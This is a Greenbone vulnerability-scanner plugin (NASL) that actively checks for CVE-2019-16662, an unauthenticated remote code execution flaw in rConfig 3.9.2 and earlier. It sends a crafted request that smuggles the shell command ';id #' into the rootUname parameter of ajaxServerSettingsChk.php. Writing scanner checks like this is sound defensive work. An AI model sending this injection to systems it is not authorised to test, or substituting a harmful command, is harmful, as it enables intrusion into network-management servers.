# SPDX-FileCopyrightText: 2019 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:rconfig:rconfig";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.143090");
  script_version("2025-03-18T05:38:50+0000");
  script_tag(name:"last_modification", value:"2025-03-18 05:38:50 +0000 (Tue, 18 Mar 2025)");
  script_tag(name:"creation_date", value:"2019-11-05 04:36:42 +0000 (Tue, 05 Nov 2019)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"severity_vector", value:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2019-10-29 19:15:00 +0000 (Tue, 29 Oct 2019)");

  script_cve_id("CVE-2019-16662");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"Mitigation");

  script_name("rConfig < 3.9.3 Unauthenticated RCE Vulnerability - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2019 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_rconfig_detect.nasl");
  script_mandatory_keys("rconfig/detected");
  script_require_ports("Services/www", 443);

  script_tag(name:"summary", value:"rConfig is prone to an unauthenticated remote code execution
  (RCE) vulnerability in ajaxServerSettingsChk.php.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"affected", value:"rConfig version 3.9.2 and prior.");

  script_tag(name:"solution", value:"Delete the install directory as proposed in the installation
  guide.");

  script_xref(name:"URL", value:"https://shells.systems/rconfig-v3-9-2-authenticated-and-unauthenticated-rce-cve-2019-16663-and-cve-2019-16662/");
  script_xref(name:"URL", value:"https://www.rconfig.com/downloads/v3-release-notes");
  script_xref(name:"URL", value:"http://help.rconfig.com/gettingstarted/postinstall");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("url_func.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

url = dir + "/install/lib/ajaxHandlers/ajaxServerSettingsChk.php?rootUname=" + urlencode(str: ";id #");

if (http_vuln_check(port: port, url: url, pattern: "uid=[0-9]+.*gid=[0-9]+", check_header: TRUE)) {
  report = "It was possible to execute the 'id' command at " + http_report_vuln_url(port: port, url: url, url_only: TRUE);
  security_message(port: port, data: report);
  exit(0);
}

exit(99);
